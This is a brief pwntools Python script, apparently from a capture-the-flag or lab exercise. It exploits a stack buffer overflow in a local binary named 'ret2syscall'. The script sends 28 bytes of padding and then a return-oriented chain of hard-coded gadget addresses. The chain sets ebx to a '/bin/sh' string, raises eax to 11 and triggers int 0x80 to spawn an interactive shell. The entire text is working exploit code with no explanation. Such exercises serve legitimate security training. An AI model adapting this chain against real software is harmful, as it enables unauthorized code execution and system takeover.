from pwn import*

o = process("./ret2syscall")

bin_sh = 0x8048550
pop_ebx = 0x8048311
xor_ret = 0x8048471
int_80 = 0x8048476
inc_eax = 0x804846b
payload = b'a'*28 + p32(pop_ebx) + p32(bin_sh)
payload += p32(xor_ret) + p32(inc_eax)*10 + p32(int_80)
pause()
o.sendline(payload)

o.interactive()
